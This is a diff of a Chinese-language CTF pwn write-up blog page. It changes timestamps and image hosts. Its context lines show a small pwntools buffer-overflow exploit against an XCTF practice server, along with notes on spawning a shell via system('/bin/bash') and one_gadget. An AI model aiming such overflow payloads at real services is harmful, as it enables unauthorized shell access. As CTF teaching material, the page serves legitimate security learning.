@@ -46,7 +46,7 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
 <meta property="article:published_time" content="2020-10-26T00:00:00.000Z">
-<meta property="article:modified_time" content="2024-03-06T09:55:23.822Z">
+<meta property="article:modified_time" content="2024-03-07T01:09:16.126Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="pwn">
 <meta property="article:tag" content="ctf">
@@ -2114,7 +2114,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     root: '/',
     debug: "env",
     default: {"avatar":"https://unpkg.com/volantis-static@0.0.1660614606622/media/placeholder/avatar/round/3442075.svg","link":"https://unpkg.com/volantis-static@0.0.1660614606622/media/placeholder/link/8f277b4ee0ecd.svg","cover":"https://unpkg.com/volantis-static@0.0.1660614606622/media/placeholder/cover/76b86c0226ffd.svg","image":"https://unpkg.com/volantis-static@0.0.1660614606622/media/placeholder/image/2659360.svg"},
-    lastupdate: new Date(1709732857950),
+    lastupdate: new Date(1709774098687),
     cdn: {
       izitoast_css: 'https://cdn.bootcdn.net/ajax/libs/izitoast/1.4.0/css/iziToast.min.css',
       izitoast_js: 'https://cdn.bootcdn.net/ajax/libs/izitoast/1.4.0/js/iziToast.min.js',
@@ -2537,7 +2537,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <p>漏洞一般是1、gets函数这种对输入没有限制导致溢出。2、格式化字符串漏洞。3、数据类型转换的时候产生了溢出。 总的来说就是对输入的值限制的不够让用户的输入影响了执行流。 那么如何利用漏洞呢？ 在linux中有一个system函数system(“&#x2F;bin&#x2F;bash”)这条语句就可以调出shell。让程序执行这个函数就能实现对shell的调用了。</p>
 <h2 id="XCTF"><a href="#XCTF" class="headerlink" title="XCTF"></a>XCTF</h2><h3 id="get-shell-XCTF"><a href="#get-shell-XCTF" class="headerlink" title="get_shell - - XCTF"></a>get_shell - - XCTF</h3><hr>
 <p>芜湖，啦啦啦啦啦~</p>
-<p><img src="https://i.loli.net/2020/08/11/wTrYEFWOPo62JZN.png" class="lazyload" data-srcset="https://i.loli.net/2020/08/11/wTrYEFWOPo62JZN.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20200811223317436"></p>
+<p><img src="https://x1ngg3-pic.oss-cn-beijing.aliyuncs.com/myimg/wTrYEFWOPo62JZN.png" class="lazyload" data-srcset="https://x1ngg3-pic.oss-cn-beijing.aliyuncs.com/myimg/wTrYEFWOPo62JZN.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20200811223317436"></p>
 <h3 id="hello-pwn-XCTF"><a href="#hello-pwn-XCTF" class="headerlink" title="hello_pwn - - XCTF"></a>hello_pwn - - XCTF</h3><hr>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&quot;220.249.52.133&quot;</span>,<span class="string">&quot;53289&quot;</span>)</span><br><span class="line">payload = <span class="number">4</span>*<span class="string">&#x27;a&#x27;</span> + p64(<span class="number">0x6E756161</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
@@ -2675,17 +2675,17 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <li><strong>首先是满足one_gadget的条件：</strong></li>
 </ul>
 <p>根据题目提供的Libc查看one_gadget:</p>
-<p><img src="https://i.loli.net/2020/10/07/u8RvOdQZqAwN3JY.png" class="lazyload" data-srcset="https://i.loli.net/2020/10/07/u8RvOdQZqAwN3JY.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20201007195646212"></p>
+<p><img src="https://x1ngg3-pic.oss-cn-beijing.aliyuncs.com/myimg/u8RvOdQZqAwN3JY.png" class="lazyload" data-srcset="https://x1ngg3-pic.oss-cn-beijing.aliyuncs.com/myimg/u8RvOdQZqAwN3JY.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20201007195646212"></p>
 <p>这里记录一下查看第四个的过程，前面三个试了下不太行，不知道是不是我操作问题，因为开启了PIE是没法直接下地址的，然后下函数的断点又报错，只能直接开跑然后看状态了，但是因为会错误退出所以我觉得也问题不大，大不了达成条件的时候用手段构造一下。</p>
 <p>gdb直接运行，然后输入，然后就自动停了。</p>
-<p><img src="https://i.loli.net/2020/10/07/DgqEoSV73zpyhub.png" class="lazyload" data-srcset="https://i.loli.net/2020/10/07/DgqEoSV73zpyhub.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20201007200030263"></p>
+<p><img src="https://x1ngg3-pic.oss-cn-beijing.aliyuncs.com/myimg/DgqEoSV73zpyhub.png" class="lazyload" data-srcset="https://x1ngg3-pic.oss-cn-beijing.aliyuncs.com/myimg/DgqEoSV73zpyhub.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20201007200030263"></p>
 <ul>
 <li><strong>为什么打过去就有权限</strong></li>
 </ul>
 <p>ok那现在知道了第四个gadget是满足条件的，那为什么把gadget打过去就能拿到权限呢，毕竟反汇编代码可是这样的：</p>
-<p><img src="https://i.loli.net/2020/10/07/jR4PDUzS1gdsZev.png" class="lazyload" data-srcset="https://i.loli.net/2020/10/07/jR4PDUzS1gdsZev.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20201007200229799"></p>
+<p><img src="https://x1ngg3-pic.oss-cn-beijing.aliyuncs.com/myimg/jR4PDUzS1gdsZev.png" class="lazyload" data-srcset="https://x1ngg3-pic.oss-cn-beijing.aliyuncs.com/myimg/jR4PDUzS1gdsZev.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20201007200229799"></p>
 <p>其实看到这种代码，心里大概就有个数了，八成是IDA犯病了，我他妈直接看汇编。</p>
-<p><img src="https://i.loli.net/2020/10/07/rg1Ex9NnQXKSF8d.png" class="lazyload" data-srcset="https://i.loli.net/2020/10/07/rg1Ex9NnQXKSF8d.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20201007200422351"></p>
+<p><img src="https://x1ngg3-pic.oss-cn-beijing.aliyuncs.com/myimg/rg1Ex9NnQXKSF8d.png" class="lazyload" data-srcset="https://x1ngg3-pic.oss-cn-beijing.aliyuncs.com/myimg/rg1Ex9NnQXKSF8d.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20201007200422351"></p>
 <p>好的那现在只差最后一步打过去了。</p>
 <ul>
 <li><strong>为什么是str()不是p64()</strong></li>
@@ -2746,10 +2746,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateModified" datetime="2024-03-06T17:55:23+08:00">
+          <div class="new-meta-item date" itemprop="dateModified" datetime="2024-03-07T09:09:16+08:00">
   <a class='notlink'>
     <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：Mar 6, 2024</p>
+    <p>更新于：Mar 7, 2024</p>
   </a>
 </div>
 
@@ -3403,7 +3403,7 @@ Arena, heap and chunkPtmalloc2通过几种数据结构来进行管理，主要�
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"x1ngg3's blog","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":"welcome to x1ngg3's blog"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"x1ngg3's blog"}},{"@type":"ListItem","position":2,"item":{"@id":"http://example.com/categories/PWN/","name":"PWN"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2020/10/26/buuoj&xctf_pwn/","name":"buuoj_pwn"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"x1ngg3's blog","url":"http://example.com/","keywords":null,"description":"welcome to x1ngg3's blog","author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":"welcome to x1ngg3's blog"},"publisher":{"@type":"Organization","name":"x1ngg3's blog","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"buuoj_pwn","description":"you_have_been_pwned","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2020/10/26/buuoj&xctf_pwn/"},"author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"x1ngg3's blog","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2020/10/26/buuoj&xctf_pwn/","wordCount":19,"datePublished":"2020-10-26T00:00:00.000Z","dateModified":"2024-03-06T09:55:23.822Z","articleSection":"PWN","keywords":"pwn,ctf","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"x1ngg3's blog","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":"welcome to x1ngg3's blog"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"x1ngg3's blog"}},{"@type":"ListItem","position":2,"item":{"@id":"http://example.com/categories/PWN/","name":"PWN"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2020/10/26/buuoj&xctf_pwn/","name":"buuoj_pwn"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"x1ngg3's blog","url":"http://example.com/","keywords":null,"description":"welcome to x1ngg3's blog","author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":"welcome to x1ngg3's blog"},"publisher":{"@type":"Organization","name":"x1ngg3's blog","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"buuoj_pwn","description":"you_have_been_pwned","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2020/10/26/buuoj&xctf_pwn/"},"author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"x1ngg3's blog","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2020/10/26/buuoj&xctf_pwn/","wordCount":19,"datePublished":"2020-10-26T00:00:00.000Z","dateModified":"2024-03-07T01:09:16.126Z","articleSection":"PWN","keywords":"pwn,ctf","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
